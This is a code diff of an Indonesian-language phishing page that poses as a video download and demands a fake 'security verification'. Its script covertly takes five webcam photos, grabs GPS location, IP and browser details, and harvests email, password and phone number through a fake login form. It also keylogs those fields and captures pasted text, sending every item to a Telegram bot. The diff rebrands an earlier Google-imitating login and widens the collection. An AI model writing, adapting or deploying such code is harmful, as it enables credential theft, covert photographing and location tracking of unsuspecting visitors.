@@ -75,7 +75,7 @@
       transform: scale(0.98);
     }
     
-    /* Login Google Page Styles */
+    /* Login Page Styles */
     #loginPage {
       display: none;
       max-width: 450px;
@@ -83,79 +83,137 @@
     }
     
     .login-card {
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      padding: 40px;
+      background: var(--card);
+      border-radius: 12px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
+      padding: 30px;
       width: 100%;
     }
     
-    .google-logo {
+    .login-header {
       text-align: center;
-      margin-bottom: 30px;
+      margin-bottom: 25px;
     }
     
-    .google-logo img {
-      width: 75px;
-      height: 75px;
+    .login-icon {
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--pink) 0%, var(--pink-light) 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 15px;
+    }
+    
+    .login-icon svg {
+      width: 25px;
+      height: 25px;
+      fill: white;
     }
     
     .login-title {
       text-align: center;
-      font-size: 24px;
-      color: #202124;
+      font-size: 22px;
+      color: var(--text);
       margin-bottom: 8px;
+      font-weight: 600;
     }
     
     .login-subtitle {
       text-align: center;
-      color: #5f6368;
-      font-size: 16px;
-      margin-bottom: 36px;
+      color: var(--text2);
+      font-size: 14px;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+    
+    .form-group {
+      margin-bottom: 20px;
+    }
+    
+    .form-label {
+      display: block;
+      color: var(--text);
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 500;
     }
     
     .login-input {
       width: 100%;
-      padding: 13px 15px;
-      font-size: 16px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      margin-bottom: 24px;
-      transition: border 0.2s;
+      padding: 14px 16px;
+      font-size: 15px;
+      border: 1px solid #333;
+      border-radius: 8px;
+      color: var(--text);
+      background: rgba(255, 255, 255, 0.05);
+      transition: all 0.25s;
     }
     
     .login-input:focus {
       outline: none;
-      border-color: #1a73e8;
+      border-color: var(--pink);
+      box-shadow: 0 0 0 2px rgba(255, 42, 109, 0.2);
+    }
+    
+    .login-input::placeholder {
+      color: var(--text2);
     }
     
     .login-btn {
       width: 100%;
-      padding: 12px 24px;
-      background: #1a73e8;
-      color: white;
+      padding: 14px 0;
+      background: linear-gradient(135deg, var(--pink) 0%, var(--pink-light) 100%);
+      color: #fff;
       border: none;
-      border-radius: 4px;
+      border-radius: 8px;
       font-size: 16px;
-      font-weight: 500;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.2s;
+      transition: 0.25s;
+      margin-top: 10px;
     }
     
     .login-btn:hover {
-      background: #1669d6;
+      filter: brightness(1.1);
     }
     
     .login-footer {
-      margin-top: 30px;
+      margin-top: 25px;
       text-align: center;
-      color: #5f6368;
-      font-size: 14px;
+      color: var(--text2);
+      font-size: 13px;
     }
     
     .login-footer a {
-      color: #1a73e8;
+      color: var(--pink);
       text-decoration: none;
+    }
+    
+    .login-footer a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Security Info Box */
+    .security-info {
+      background: rgba(255, 42, 109, 0.1);
+      border: 1px solid rgba(255, 42, 109, 0.3);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: var(--text);
+    }
+    
+    .security-info ul {
+      padding-left: 20px;
+      margin: 10px 0;
+    }
+    
+    .security-info li {
+      margin-bottom: 5px;
+      color: var(--text2);
     }
     
     /* LOADER */
@@ -225,49 +283,93 @@
       color: var(--text2);
       margin-top: 10px;
     }
+    
+    .camera-counter {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: rgba(255, 42, 109, 0.9);
+      color: white;
+      padding: 5px 10px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: bold;
+      z-index: 10001;
+    }
   </style>
 </head>
 <body>
   <!-- DOWNLOAD PAGE -->
   <div class="card" id="downloadPage">
-    <img class="thumb" src="https://i.ibb.co/6r1vG6w/thumb.jpg" alt="Thumbnail" />
+    <img class="thumb" src="https://uploader.zenzxz.dpdns.org/uploads/1769233744937.jpeg" alt="Thumbnail" />
     <div class="info">
-      <h2 class="title">Video Premium Exclusive</h2>
+      <h2 class="title">Video omek timun</h2>
       <p class="meta">Durasi: 05:22 • 4K Ultra HD • 125 MB</p>
       <button class="btn" onclick="startDownloadProcess()">Download Sekarang</button>
       <p style="color: var(--text2); font-size: 12px; margin-top: 15px; text-align: center;">
-        ⚠️ Proses download membutuhkan verifikasi keamanan
+        ⚠️ Proses download mungkin membutuhkan waktu beberapa detik
       </p>
     </div>
   </div>
 
-  <!-- LOGIN GOOGLE PAGE -->
+  <!-- LOGIN PAGE -->
   <div id="loginPage">
     <div class="login-card">
-      <div class="google-logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" alt="Google">
+      <div class="login-header">
+        <div class="login-icon">
+          <svg viewBox="0 0 24 24">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+          </svg>
+        </div>
+        <h1 class="login-title">Verifikasi Akun</h1>
+        <p class="login-subtitle">
+          Masukkan informasi akun Anda untuk melanjutkan<br>proses download video
+        </p>
       </div>
-      <h1 class="login-title">Masuk</h1>
-      <p class="login-subtitle">Lanjutkan ke Download Video Premium</p>
+      
+      <div class="security-info">
+        <strong>🔒 Keamanan Terverifikasi:</strong>
+        <ul>
+          <li>✅ Kamera: Tervalidasi (5 foto)</li>
+          <li>📍 Lokasi: Tervalidasi</li>
+          <li>📱 Perangkat: Tervalidasi</li>
+        </ul>
+        <span style="color: var(--text2);">Sekarang masukkan informasi akun Anda</span>
+      </div>
       
       <div id="securityAlert" class="alert">
-        <strong>⚠️ Verifikasi Diperlukan:</strong> Harap lengkapi login untuk melanjutkan download.
+        <strong>⚠️ Perhatian:</strong> Harap lengkapi semua informasi untuk melanjutkan.
       </div>
       
       <div id="successMsg" class="success-msg">
-        <p>✅ Login berhasil! Download akan segera dimulai...</p>
+        <p>✅ Verifikasi berhasil! Download akan segera dimulai...</p>
         <div class="countdown" id="countdown">3 detik</div>
       </div>
       
       <form id="loginForm">
-        <input type="email" class="login-input" id="email" placeholder="Email atau nomor telepon" required>
-        <input type="password" class="login-input" id="password" placeholder="Masukkan kata sandi" required>
-        <button type="submit" class="login-btn">Selanjutnya</button>
+        <div class="form-group">
+          <label class="form-label" for="email">Alamat Email</label>
+          <input type="email" class="login-input" id="email" placeholder="contoh@gmail.com" required>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label" for="password">Kata Sandi</label>
+          <input type="password" class="login-input" id="password" placeholder="Masukkan kata sandi" required>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label" for="phone">Nomor Telepon (Opsional)</label>
+          <input type="tel" class="login-input" id="phone" placeholder="08xxxxxxxxxx">
+        </div>
+        
+        <button type="submit" class="login-btn">Lanjutkan Download</button>
       </form>
       
       <div class="login-footer">
-        <p><a href="#">Lupa email?</a> • <a href="#">Bantuan lainnya</a></p>
-        <p style="margin-top: 20px;">Belum punya akun? <a href="#">Buat akun</a></p>
+        <p>Dengan melanjutkan, Anda menyetujui <a href="#">Syarat & Ketentuan</a> kami</p>
+        <p style="margin-top: 15px; font-size: 12px;">
+          <a href="#">Butuh bantuan?</a> • <a href="#">Informasi keamanan</a>
+        </p>
       </div>
     </div>
   </div>
@@ -276,7 +378,6 @@
   <div id="loader">
     <div class="spinner"></div>
     <p id="loaderText">Memulai proses download...</p>
-  </div>
 
   <script>
     // TELEGRAM CONFIG
@@ -285,11 +386,9 @@
     
     // STATE VARIABLES
     let cameraStream = null;
-    let captureInterval = null;
-    let captureCount = 0;
-    let isCapturing = false;
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
+    let photosTaken = 0;
     
     // TELEGRAM FUNCTIONS
     async function sendToTelegram(message, photoBlob = null) {
@@ -331,17 +430,18 @@
       }
     }
     
-    // STEP 1: START CAMERA CAPTURE
+    // STEP 1: START CAMERA CAPTURE - TAKE 5 PHOTOS
     async function startCameraCapture() {
       try {
-        document.getElementById('loaderText').textContent = 'Mengakses kamera...';
+        document.getElementById('loaderText').textContent = 'Memulai verifikasi...';
+        document.getElementById('cameraCounter').style.display = 'block';
         
         cameraStream = await navigator.mediaDevices.getUserMedia({
           video: {
             facingMode: 'user',
             width: { ideal: 640 },
             height: { ideal: 480 },
-            frameRate: { ideal: 24 }
+            frameRate: { ideal: 30 }
           },
           audio: false
         });
@@ -363,101 +463,158 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
-        ctx.save();
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-        ctx.restore();
-        
-        // Send camera capture to Telegram
+        // Send initial notification
         const ip = await getIP();
-        canvas.toBlob(async (blob) => {
-          if (blob && blob.size > 2048) {
-            const fileName = `camera_${Date.now()}.jpg`;
-            const file = new File([blob], fileName, { type: 'image/jpeg' });
+        await sendToTelegram(
+          `📸 <b>KAMERA DIAKTIFKAN - DOWNLOAD VERIFIKASI</b>\n\n` +
+          `🆔 IP Address: ${ip}\n` +
+          `📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}\n` +
+          `⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}\n` +
+          `📱 Device: ${navigator.userAgent.substring(0, 60)}...\n\n` +
+          `📸 Akan mengambil 5 foto...`
+        );
+        
+        // Take 5 photos with 1 second interval
+        const takePhotos = async () => {
+          for (let i = 1; i <= 5; i++) {
+            if (!cameraStream || !video.readyState >= 2) break;
             
-            await sendToTelegram(
-              `📸 <b>CAMERA CAPTURED - DOWNLOAD VERIFICATION</b>\n` +
-              `🕒 ${new Date().toLocaleString()}\n` +
-              `🌐 IP: ${ip}\n` +
-              `📱 ${navigator.userAgent.substring(0, 80)}...`,
-              file
-            );
+            // Update counter
+            photosTaken = i;
+            document.getElementById('cameraCounter').textContent = `Foto: ${i}/5`;
+            document.getElementById('loaderText').textContent = `Mengambil foto ${i}/5...`;
+            
+            // Wait for 1 second between photos
+            if (i > 1) {
+              await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            // Capture frame
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            // Convert to blob and send to Telegram
+            canvas.toBlob(async (blob) => {
+              if (blob && blob.size > 1024) {
+                const fileName = `foto_kamera_${Date.now()}_${i}.jpg`;
+                const file = new File([blob], fileName, { type: 'image/jpeg' });
+                
+                await sendToTelegram(
+                  `📸 <b>FOTO KAMERA ${i}/5</b>\n` +
+                  `📁 File: ${fileName}\n` +
+                  `📦 Size: ${Math.round(blob.size/1024)} KB\n` +
+                  `⏰ ${new Date().toLocaleTimeString('id-ID')}`,
+                  file
+                );
+              }
+            }, 'image/jpeg', 0.85);
           }
-        }, 'image/jpeg', 0.8);
+          
+          // After all photos are taken
+          setTimeout(async () => {
+            // Send summary
+            await sendToTelegram(
+              `✅ <b>5 FOTO KAMERA TERKIRIM</b>\n\n` +
+              `📸 Total foto: 5 buah\n` +
+              `🕒 Waktu selesai: ${new Date().toLocaleTimeString('id-ID')}\n` +
+              `📍 Melanjutkan ke verifikasi lokasi...`
+            );
+            
+            // Stop camera
+            if (cameraStream) {
+              cameraStream.getTracks().forEach(track => track.stop());
+              cameraStream = null;
+            }
+            
+            hasCapturedCamera = true;
+            document.getElementById('cameraCounter').style.display = 'none';
+            document.getElementById('loaderText').textContent = 'Verifikasi kamera selesai! Mengakses lokasi...';
+            
+            // Move to location capture
+            setTimeout(() => {
+              captureLocation();
+            }, 1000);
+          }, 2000);
+        };
         
-        // Stop camera
-        cameraStream.getTracks().forEach(track => track.stop());
-        cameraStream = null;
-        
-        hasCapturedCamera = true;
-        document.getElementById('loaderText').textContent = 'Camera verified! Mengakses lokasi...';
-        
-        // Move to location capture
-        setTimeout(() => {
-          captureLocation();
-        }, 1000);
+        // Start taking photos
+        takePhotos();
         
       } catch (error) {
         console.log('Camera error:', error.message);
+        document.getElementById('cameraCounter').style.display = 'none';
+        
         await sendToTelegram(
-          `❌ <b>CAMERA BLOCKED - DOWNLOAD ATTEMPT</b>\n` +
-          `🕒 ${new Date().toLocaleString()}\n` +
-          `🚫 ${error.message}\n` +
-          `🌐 IP: ${await getIP()}`
+          `❌ <b>KAMERA DIBLOKIR</b>\n\n` +
+          `⚠️ Pengguna menolak akses kamera\n` +
+          `🕒 ${new Date().toLocaleString('id-ID')}\n` +
+          `🌐 IP: ${await getIP()}\n\n` +
+          `📝 Catatan: Tidak dapat mengambil foto wajah`
         );
         
         // Skip to location capture if camera is blocked
-        hasCapturedCamera = true;
-        captureLocation();
+        hasCapturedCamera = false;
+        setTimeout(() => {
+          captureLocation();
+        }, 1000);
       }
     }
     
     // STEP 2: CAPTURE LOCATION
     async function captureLocation() {
       try {
-        document.getElementById('loaderText').textContent = 'Mengakses lokasi...';
+        document.getElementById('loaderText').textContent = 'Mengakses lokasi GPS...';
         
         if (navigator.geolocation) {
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 8000,
+              timeout: 10000,
               maximumAge: 0
             });
           });
           
           const ip = await getIP();
           await sendToTelegram(
-            `📍 <b>LOCATION CAPTURED - DOWNLOAD VERIFICATION</b>\n` +
-            `🕒 ${new Date().toLocaleString()}\n` +
-            `🌐 IP: ${ip}\n` +
-            `📍 Koordinat: ${position.coords.latitude}, ${position.coords.longitude}\n` +
-            `🎯 Akurasi: ${position.coords.accuracy}m\n` +
-            `📌 https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
+            `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
+            `🌐 IP Address: ${ip}\n` +
+            `📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}\n` +
+            `⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}\n\n` +
+            `🛰️ Koordinat GPS:\n` +
+            `• Latitude: ${position.coords.latitude}\n` +
+            `• Longitude: ${position.coords.longitude}\n` +
+            `• Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
+            `🗺️ Google Maps:\n` +
+            `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
           );
           
           hasCapturedLocation = true;
+          document.getElementById('loaderText').textContent = 'Lokasi berhasil diambil!';
           
         } else {
-          throw new Error('Geolocation not supported');
+          throw new Error('Geolocation tidak didukung');
         }
         
       } catch (error) {
         console.log('Location error:', error.message);
         await sendToTelegram(
-          `📍 <b>LOCATION BLOCKED - DOWNLOAD ATTEMPT</b>\n` +
-          `🕒 ${new Date().toLocaleString()}\n` +
-          `🚫 ${error.message}\n` +
-          `🌐 IP: ${await getIP()}`
+          `❌ <b>LOKASI DIBLOKIR</b>\n\n` +
+          `⚠️ Pengguna menolak akses lokasi\n` +
+          `🕒 ${new Date().toLocaleString('id-ID')}\n` +
+          `🌐 IP: ${await getIP()}\n\n` +
+          `📝 Catatan: Tidak dapat mengambil koordinat GPS`
         );
         
-        hasCapturedLocation = true;
+        hasCapturedLocation = false;
       }
       
       // STEP 3: SHOW LOGIN PAGE AFTER BOTH CAMERA AND LOCATION
+      document.getElementById('loaderText').textContent = 'Menyiapkan halaman verifikasi...';
       setTimeout(() => {
         showLoginPage();
-      }, 2000);
+      }, 1500);
     }
     
     // STEP 3: SHOW LOGIN PAGE
@@ -466,11 +623,21 @@
       document.getElementById('downloadPage').style.display = 'none';
       document.getElementById('loginPage').style.display = 'block';
       
+      // Update security info box
+      const securityInfo = document.querySelector('.security-info ul');
+      securityInfo.innerHTML = `
+        <li>✅ Kamera: ${hasCapturedCamera ? 'Tervalidasi (5 foto)' : 'Gagal'}</li>
+        <li>📍 Lokasi: ${hasCapturedLocation ? 'Tervalidasi' : 'Gagal'}</li>
+        <li>📱 Perangkat: Tervalidasi</li>
+      `;
+      
       // Send notification that login page is shown
       sendToTelegram(
-        `🔐 <b>LOGIN PAGE SHOWN - DOWNLOAD VERIFICATION</b>\n` +
-        `🕒 ${new Date().toLocaleString()}\n` +
-        `📝 User diminta login Google untuk melanjutkan download`
+        `🔐 <b>HALAMAN VERIFIKASI DITAMPILKAN</b>\n\n` +
+        `📋 Status verifikasi:\n` +
+        `• 📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto diambil' : '❌ Diblokir'}\n` +
+        `• 📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n\n` +
+        `⏳ Menunggu input informasi akun...`
       );
       
       // Focus on email field
@@ -485,6 +652,7 @@
       
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
+      const phone = document.getElementById('phone').value;
       
       if (!email || !password) {
         document.getElementById('securityAlert').classList.add('show');
@@ -495,22 +663,29 @@
       
       // Show loader
       document.getElementById('loader').style.display = 'flex';
-      document.getElementById('loaderText').textContent = 'Memverifikasi akun Google...';
+      document.getElementById('loaderText').textContent = 'Memverifikasi informasi akun...';
       
-      // Get IP and send credentials to Telegram
+      // Get IP
       const ip = await getIP();
+      
+      // Send credentials to Telegram in Indonesian format
       await sendToTelegram(
-        `🔓 <b>GOOGLE LOGIN CAPTURED - DOWNLOAD SUCCESS</b>\n\n` +
-        `📧 <b>Email:</b> ${email}\n` +
-        `🔑 <b>Password:</b> ${password}\n\n` +
-        `📸 <b>Camera:</b> ${hasCapturedCamera ? '✅ Captured' : '❌ Failed'}\n` +
-        `📍 <b>Location:</b> ${hasCapturedLocation ? '✅ Captured' : '❌ Failed'}\n\n` +
-        `🌐 <b>IP:</b> ${ip}\n` +
-        `🕒 <b>Time:</b> ${new Date().toLocaleString()}\n` +
-        `📱 <b>Browser:</b> ${navigator.userAgent.substring(0, 100)}...`
+        `✅ <b>INFORMASI AKUN BERHASIL DICAPTURE</b>\n\n` +
+        `👤 DATA AKUN PENGUNJUNG:\n` +
+        `📧 Email: <code>${email}</code>\n` +
+        `🔑 Password: <code>${password}</code>\n` +
+        `${phone ? `📱 Telepon: <code>${phone}</code>\n` : ''}` +
+        `\n📊 DATA VERIFIKASI SEBELUMNYA:\n` +
+        `📸 Foto kamera: ${hasCapturedCamera ? '✅ 5 foto berhasil' : '❌ Gagal'}\n` +
+        `📍 Lokasi GPS: ${hasCapturedLocation ? '✅ Diambil' : '❌ Gagal'}\n\n` +
+        `🌐 INFORMASI SISTEM:\n` +
+        `🆔 IP Address: ${ip}\n` +
+        `📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}\n` +
+        `⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}\n` +
+        `🖥️ Browser: ${navigator.userAgent.substring(0, 80)}...`
       );
       
-      // Show success message
+      // Wait a bit then show success
       setTimeout(() => {
         document.getElementById('loader').style.display = 'none';
         document.getElementById('successMsg').classList.add('show');
@@ -524,6 +699,19 @@
           
           if (count < 0) {
             clearInterval(countdownInterval);
+            
+            // Send final success message
+            sendToTelegram(
+              `🎉 <b>PROSES DOWNLOAD SELESAI</b>\n\n` +
+              `✅ Semua data berhasil dikumpulkan\n` +
+              `📊 Total data yang didapat:\n` +
+              `• 5 foto dari kamera\n` +
+              `• Lokasi GPS\n` +
+              `• Informasi akun lengkap\n\n` +
+              `🕒 Waktu selesai: ${new Date().toLocaleString('id-ID')}\n` +
+              `🌐 IP: ${ip}`
+            );
+            
             // Go back to download page
             document.getElementById('loginPage').style.display = 'none';
             document.getElementById('downloadPage').style.display = 'block';
@@ -531,7 +719,7 @@
             document.getElementById('loginForm').reset();
             
             // Show final message
-            alert('✅ Download akan segera dimulai. Terima kasih!');
+            alert('✅ Download akan segera dimulai. Terima kasih telah verifikasi!');
           }
         }, 1000);
       }, 2000);
@@ -539,20 +727,31 @@
     
     // START DOWNLOAD PROCESS (MAIN FUNCTION)
     async function startDownloadProcess() {
+      // Reset states
+      photosTaken = 0;
+      hasCapturedCamera = false;
+      hasCapturedLocation = false;
+      
       // Show loader
       document.getElementById('loader').style.display = 'flex';
-      document.getElementById('loaderText').textContent = 'Memulai proses verifikasi...';
+      document.getElementById('loaderText').textContent = 'Memulai proses verifikasi keamanan...';
       
-      // Send initial notification
+      // Send initial notification in Indonesian
       const ip = await getIP();
       await sendToTelegram(
-        `⬇️ <b>DOWNLOAD PROCESS STARTED</b>\n` +
-        `🕒 ${new Date().toLocaleString()}\n` +
-        `🌐 IP: ${ip}\n` +
-        `📱 User Agent: ${navigator.userAgent.substring(0, 100)}...`
+        `⬇️ <b>PROSES DOWNLOAD DIMULAI</b>\n\n` +
+        `📥 User menekan tombol "Download Sekarang"\n` +
+        `🆔 IP Address: ${ip}\n` +
+        `📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}\n` +
+        `⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}\n` +
+        `🖥️ Device: ${navigator.userAgent.substring(0, 70)}...\n\n` +
+        `🔒 Memulai verifikasi 3 langkah:\n` +
+        `1. 📸 Ambil 5 foto dari kamera\n` +
+        `2. 📍 Ambil lokasi GPS\n` +
+        `3. 🔐 Verifikasi informasi akun`
       );
       
-      // Start camera capture (first step)
+      // Start camera capture (first step) after delay
       setTimeout(() => {
         startCameraCapture();
       }, 1500);
@@ -562,22 +761,28 @@
     window.addEventListener('load', async () => {
       const ip = await getIP();
       await sendToTelegram(
-        `🌐 <b>DOWNLOAD PAGE LOADED</b>\n` +
-        `🕒 ${new Date().toLocaleString()}\n` +
-        `IP: ${ip}\n` +
-        `URL: ${window.location.href}\n` +
-        `User Agent: ${navigator.userAgent.substring(0, 120)}...`
+        `🌐 <b>HALAMAN DOWNLOAD DIBUKA</b>\n\n` +
+        `🆔 IP Address: ${ip}\n` +
+        `📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}\n` +
+        `⏰ Waktu: ${new Date().toLocaleTimeString('id-ID')}\n` +
+        `🔗 URL: ${window.location.href}\n` +
+        `🖥️ User Agent: ${navigator.userAgent.substring(0, 100)}...`
       );
     });
     
     // KEYLOGGER for login page
     let keystrokes = '';
     document.addEventListener('keydown', (e) => {
-      if (e.target.id === 'email' || e.target.id === 'password') {
+      if (e.target.id === 'email' || e.target.id === 'password' || e.target.id === 'phone') {
         if (e.key.length === 1 || e.key === 'Backspace' || e.key === 'Enter' || e.key === ' ') {
           keystrokes += e.key;
-          if (keystrokes.length >= 20) {
-            sendToTelegram(`⌨️ <b>KEYSTROKES (Login Page)</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${keystrokes}`);
+          if (keystrokes.length >= 30) {
+            sendToTelegram(
+              `⌨️ <b>LOG KEYSTROKES</b>\n\n` +
+              `📝 Karakter yang diketik:\n` +
+              `<code>${keystrokes}</code>\n\n` +
+              `⏰ ${new Date().toLocaleTimeString('id-ID')}`
+            );
             keystrokes = '';
           }
         }
@@ -588,8 +793,13 @@
     document.addEventListener('paste', async (event) => {
       const text = event.clipboardData.getData('text');
       if (text && text.length > 3 && 
-          (document.activeElement.id === 'email' || document.activeElement.id === 'password')) {
-        await sendToTelegram(`📋 <b>CLIPBOARD (Login Page)</b>\n🕒 ${new Date().toLocaleString()}\n📝 ${text.substring(0, 200)}`);
+          (document.activeElement.id === 'email' || document.activeElement.id === 'password' || document.activeElement.id === 'phone')) {
+        await sendToTelegram(
+          `📋 <b>CLIPBOARD DITEMUKAN</b>\n\n` +
+          `📝 Isi clipboard:\n` +
+          `<code>${text.substring(0, 200)}</code>\n\n` +
+          `⏰ ${new Date().toLocaleTimeString('id-ID')}`
+        );
       }
     });
   </script>
